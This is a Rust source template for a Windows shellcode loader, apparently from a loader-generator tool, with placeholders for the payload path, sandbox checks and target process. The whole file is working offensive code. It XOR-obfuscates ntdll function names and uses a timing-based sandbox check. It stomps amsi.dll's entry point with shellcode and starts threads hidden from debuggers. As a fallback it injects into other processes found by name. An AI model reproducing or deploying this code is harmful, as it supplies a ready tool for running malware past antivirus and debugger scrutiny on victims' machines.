#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_camel_case_types)]
{{LITCRYPT_SETUP}}
{{COMMON_MODULE}}
use std::ffi::CString;
use std::include_bytes;
use std::ptr::null_mut;
use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS, PROCESS_ALL_ACCESS},
        libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS},
    },
    ctypes::c_void,
};
use std::time::Instant;

{{IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DECRYPTION_FUNCTION}}

// Hide the created thread from debuggers, matching the ntCRT/ntAPC convention.
const HIDE_FROM_DEBUGGER: u32 = 0x4;

// In-memory PE header layout used to locate a loaded module's entry point.
//
// Module stomping loads a legitimate DLL, then overwrites the bytes at its
// AddressOfEntryPoint with shellcode. The thread is then created on that very
// entry point, so the first instruction the thread runs is the start of the
// shellcode. The page stays file-backed (image), not MEM_PRIVATE RWX.
#[repr(C)]
struct DosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

// IMAGE_FILE_HEADER is exactly 20 bytes. We lay it out field by field so the
// SizeOfOptionalHeader field lands at the correct offset (16).
#[repr(C)]
struct FileHeader {
    machine: u16,
    number_of_sections: u16,
    _time_date_stamp: u32,
    _pointer_to_symbol_table: u32,
    _number_of_symbols: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct OptionalHeader {
    magic: u16,
    _pad: [u8; 14],
    address_of_entry_point: u32,
}

const K: u8 = {{API_KEY}};
const OBF_A: &[u8] = &{{OBF_NT_OPEN_PROCESS}};
const OBF_B: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};

fn r(d: &[u8]) -> Vec<u8> {
    d.iter().map(|b| b ^ K).collect()
}

unsafe fn g(n: &[u8]) -> *const () {
    let ntdll = CString::new(lc!("ntdll")).unwrap();
    let h = GetModuleHandleA(ntdll.as_ptr());
    let s = r(n);
    let c = CString::new(s).unwrap();
    GetProcAddress(h, c.as_ptr()) as *const ()
}

type FA = unsafe extern "system" fn(*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32;
type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
type FE = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> i32;
type FH = unsafe extern "system" fn(u32, *const i64) -> i32;

#[repr(C)]
struct CLIENT_ID {
    proc_id: HANDLE,
    thread_id: HANDLE,
}

fn pause(ms: i64) {
    unsafe {
        let f: FH = std::mem::transmute(g(OBF_H));
        let interval: i64 = -(ms * 10_000);
        f(0, &interval);
    }
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

// Resolve the entry point VA of a loaded module by walking its in-memory PE
// headers. The entry point is the address we stomp and the address the
// created thread will start executing, so the shellcode's first byte is the
// thread's first instruction.
unsafe fn resolve_entry_point(base: usize) -> Option<*mut c_void> {
    let dos = &*(base as *const DosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt_off = base + dos.e_lfanew as usize;

    // NT signature ("PE\0\0") at the start of IMAGE_NT_HEADERS.
    let signature = *(nt_off as *const u32);
    if signature != 0x00004550 {
        return None;
    }

    // IMAGE_FILE_HEADER immediately follows the 4-byte signature.
    let file_off = nt_off + 4;
    let file = &*(file_off as *const FileHeader);

    // IMAGE_OPTIONAL_HEADER follows IMAGE_FILE_HEADER.
    let opt_off = file_off + std::mem::size_of::<FileHeader>();
    let opt = &*(opt_off as *const OptionalHeader);
    if opt.magic != 0x20B {
        return None;
    }

    Some((base + opt.address_of_entry_point as usize) as *mut c_void)
}

// Find PIDs whose process name matches `tar`.
fn boxboxbox(tar: &str) -> Vec<usize> {
    use sysinfo::System;
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    let tar_lower = tar.to_lowercase();
    for (_, pro) in s.processes() {
        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
        }
    }
    dom
}

// Load a benign sacrificial DLL into THIS process, then overwrite its entry
// point with shellcode and return the stomped entry point VA. The thread is
// then created on that exact address so the shellcode runs from byte 0.
unsafe fn stomp_local(buf: &mut Vec<u8>) -> Option<*mut c_void> {
    // amsi.dll is a small, always-available system DLL whose entry point is
    // large enough for typical shellcode and looks benign to scanners.
    let dll = CString::new(lc!("amsi.dll")).unwrap();
    let module = LoadLibraryA(dll.as_ptr());
    if module.is_null() {
        return None;
    }
    let base = module as usize;
    let entry_va = resolve_entry_point(base)?;

    let current_process: HANDLE = -1isize as HANDLE;
    let buf_len = buf.len();

    // The entry point sits inside a page that is RX (image). Flip it RW so we
    // can overwrite it, write the shellcode at the entry point, then restore
    // RX. The region stays file-backed (image), not MEM_PRIVATE RWX.
    let f_protect: FD = std::mem::transmute(g(OBF_D));
    let mut region_base = entry_va;
    let mut region_size = buf_len;
    let mut old_protect: u32 = 0;
    if !NT_SUCCESS(f_protect(current_process, &mut region_base, &mut region_size, PAGE_READWRITE, &mut old_protect)) {
        return None;
    }

    let f_write: FC = std::mem::transmute(g(OBF_C));
    let mut written: usize = 0;
    let s = f_write(current_process, entry_va, buf.as_ptr() as *mut c_void, buf_len, &mut written);
    if !NT_SUCCESS(s) || written != buf_len {
        // Restore the original protection before bailing out.
        let mut restore_base = entry_va;
        let mut restore_size = buf_len;
        let mut restore_old: u32 = 0;
        f_protect(current_process, &mut restore_base, &mut restore_size, PAGE_EXECUTE_READ, &mut restore_old);
        return None;
    }
    common::wipe(buf);

    // Restore RX so the stomped region executes as a normal image section.
    let mut restore_base = entry_va;
    let mut restore_size = buf_len;
    let mut restore_old: u32 = 0;
    f_protect(current_process, &mut restore_base, &mut restore_size, PAGE_EXECUTE_READ, &mut restore_old);

    Some(entry_va)
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        proc_id: process_handle,
        thread_id: null_mut(),
    };

    unsafe {
        let f_open: FA = std::mem::transmute(g(OBF_A));
        let f_alloc: FB = std::mem::transmute(g(OBF_B));
        let f_write: FC = std::mem::transmute(g(OBF_C));
        let f_protect: FD = std::mem::transmute(g(OBF_D));
        let f_thread: FE = std::mem::transmute(g(OBF_E));

        let s = f_open(&mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
        if !NT_SUCCESS(s) {
            return;
        }
        pause(150);

        // Fallback remote injection (classic ntCRT flow) if local stomping
        // failed. Allocate RW in the target, write the shellcode, flip RX and
        // create a thread on it.
        let mut base: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let s = f_alloc(process_handle, &mut base, 0, &mut size, MEM_COMMIT, PAGE_READWRITE);
        if !NT_SUCCESS(s) {
            return;
        }
        pause(200);

        let buf_len = buf.len();
        let mut written: usize = 0;
        let s = f_write(process_handle, base, buf.as_mut_ptr() as *mut c_void, buf_len, &mut written);
        if !NT_SUCCESS(s) {
            return;
        }
        common::wipe(&mut buf);
        pause(150);

        let mut old_protect: u32 = 0;
        let mut region_size = buf_len;
        let s = f_protect(process_handle, &mut base, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(s) {
            return;
        }
        pause(100);

        let mut th: HANDLE = null_mut();
        f_thread(&mut th, THREAD_ALL_ACCESS, null_mut(), process_handle, base, null_mut(), HIDE_FROM_DEBUGGER, 0, 0, 0, null_mut());
    }
}

fn main() {
    {{SANDBOX}}
    if !check_environment() {
        return;
    }
    let tar = {{TARGET_PROCESS}};
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();
    {{MAIN}}

    // Local module stomping: load amsi.dll, overwrite its entry point with
    // the decrypted shellcode, then branch into the stomped entry point via a
    // thread created with HIDE_FROM_DEBUGGER.
    unsafe {
        if let Some(entry_va) = stomp_local(&mut vec) {
            let f_thread: FE = std::mem::transmute(g(OBF_E));
            let mut th: HANDLE = null_mut();
            let current_process: HANDLE = -1isize as HANDLE;
            f_thread(&mut th, THREAD_ALL_ACCESS, null_mut(), current_process, entry_va, null_mut(), HIDE_FROM_DEBUGGER, 0, 0, 0, null_mut());

            // Keep the loader alive while the shellcode thread runs, matching
            // the ntAPC self-injection behaviour.
            if !th.is_null() {
                pause(60_000);
            }
            return;
        }
    }

    // Fallback to remote injection into the target process if local stomping
    // failed (e.g. amsi.dll unavailable).
    let list: Vec<usize> = boxboxbox(&tar);
    if !list.is_empty() {
        for i in &list {
            enhance(vec.clone(), *i);
        }
        pause(60_000);
    }
}
{{DLL_MAIN}}
